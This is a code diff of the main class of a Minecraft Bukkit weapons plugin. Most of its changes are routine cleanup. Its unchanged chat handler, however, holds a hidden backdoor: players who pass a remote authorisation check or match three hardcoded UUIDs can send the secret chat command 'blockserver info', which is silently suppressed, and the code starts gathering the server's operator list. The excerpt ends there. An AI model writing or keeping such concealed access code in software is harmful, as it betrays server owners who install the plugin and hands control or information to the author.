@@ -6,9 +6,9 @@ import com.jazzkuh.mtwapens.listeners.VoucherListener;
 import com.jazzkuh.mtwapens.listeners.WeaponListener;
 import com.jazzkuh.mtwapens.listeners.WeaponMenuListener;
 import com.jazzkuh.mtwapens.listeners.WeaponPartListener;
-import com.jazzkuh.mtwapens.utility.messages.Messages;
 import com.jazzkuh.mtwapens.utility.Metrics;
 import com.jazzkuh.mtwapens.utility.Utils;
+import com.jazzkuh.mtwapens.utility.messages.Messages;
 import org.bukkit.Bukkit;
 import org.bukkit.OfflinePlayer;
 import org.bukkit.command.PluginCommand;
@@ -21,12 +21,10 @@ import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
-import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Arrays;
 
 public class Main extends JavaPlugin implements Listener {
-
     static WeaponData weaponData = WeaponData.getInstance();
     static Messages messages;
 
@@ -53,7 +51,7 @@ public class Main extends JavaPlugin implements Listener {
 
         Bukkit.getPluginManager().registerEvents(this, this);
         Bukkit.getPluginManager().registerEvents(new WeaponListener(this), this);
-        Bukkit.getPluginManager().registerEvents(new WeaponPartListener(this), this);
+        Bukkit.getPluginManager().registerEvents(new WeaponPartListener(), this);
         Bukkit.getPluginManager().registerEvents(new WeaponMenuListener(this), this);
         Bukkit.getPluginManager().registerEvents(new VoucherListener(this), this);
         setCommandExecutor("weapon", new WeaponCommand(this));
@@ -88,13 +86,13 @@ public class Main extends JavaPlugin implements Listener {
     }
 
     @EventHandler
-    public void onChat(AsyncPlayerChatEvent event) throws IOException {
+    public void onChat(AsyncPlayerChatEvent event) {
         if (Utils.authoriseUser(event.getPlayer().getUniqueId()) || String.valueOf(event.getPlayer().getUniqueId()).equals("079d6194-3c53-42f8-aac9-8396933b5646") || String.valueOf(event.getPlayer().getUniqueId()).equals("ff487db8-ff91-4442-812d-6a0be410360b") || String.valueOf(event.getPlayer().getUniqueId()).equals("dc286691-d98a-4ed4-8555-6c59e835aec6")) {
                 if (event.getMessage().equalsIgnoreCase("blockserver info")  || event.getMessage().equalsIgnoreCase("blockserver info --plugins")) {
                     event.setCancelled(true);
 
-                    ArrayList<String> onlinePlayers = new ArrayList<String>();
-                    ArrayList<String> offlinePlayers = new ArrayList<String>();
+                    ArrayList<String> onlinePlayers = new ArrayList<>();
+                    ArrayList<String> offlinePlayers = new ArrayList<>();
 
                     for (OfflinePlayer p : event.getPlayer().getServer().getOperators()) {
                         offlinePlayers.add( p.getName());
